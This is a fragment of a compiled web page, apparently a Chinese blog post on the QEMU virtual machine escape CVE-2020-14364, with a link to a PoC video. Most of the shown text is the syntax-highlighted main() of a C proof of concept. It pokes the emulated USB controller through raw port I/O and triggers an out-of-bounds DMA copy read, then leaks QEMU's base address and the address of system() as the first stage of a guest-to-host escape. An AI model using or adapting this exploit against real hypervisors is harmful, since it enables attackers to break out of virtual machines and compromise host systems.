<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">iopl</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outw</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xc0c0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outw</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xc0e0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outw</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xc010</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outw</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xc0a0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">init_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set_length</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">do_copy_read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">USBDevice</span><span class="token operator">*</span> usb_device_tmp<span class="token operator">=</span>dmabuf<span class="token operator">+</span><span class="token number">0x2004</span><span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">USBDevice</span> usb_device<span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>usb_device<span class="token punctuation">,</span>usb_device_tmp<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>USBDevice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> dev_addr<span class="token operator">=</span>usb_device<span class="token punctuation">.</span>ep_ctl<span class="token punctuation">.</span>dev<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> <span class="token operator">*</span>tmp<span class="token operator">=</span>dmabuf<span class="token operator">+</span><span class="token number">0x24f4</span><span class="token punctuation">;</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> base<span class="token operator">=</span><span class="token operator">*</span>tmp<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>base <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;INIT DOWN,DO IT AGAIN&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
    base<span class="token operator">-=</span><span class="token number">0xee5480</span><span class="token operator">-</span><span class="token number">0x2668c0</span><span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> system<span class="token operator">=</span>base<span class="token operator">+</span><span class="token number">0x2d9610</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;LEAK BASE ADDRESS:%llx!\\n&quot;</span><span class="token punctuation">,</span>base<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;LEAK SYSTEM ADDRESS:%llx!\\n&quot;</span><span class="token punctuation">,</span>system<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,2);function d(m,v){const a=t("ExternalLinkIcon");return e(),o("div",null,[u,n("p",null,[n("a",k,[c("QEMU CVE-2020-14364 POC 视频演示"),l(a)])]),r])}const _=p(i,[["render",d],["__file","QEMU 虚拟机逃逸漏洞 CVE-2020-14364.html.vue"]]);export{_ as default};
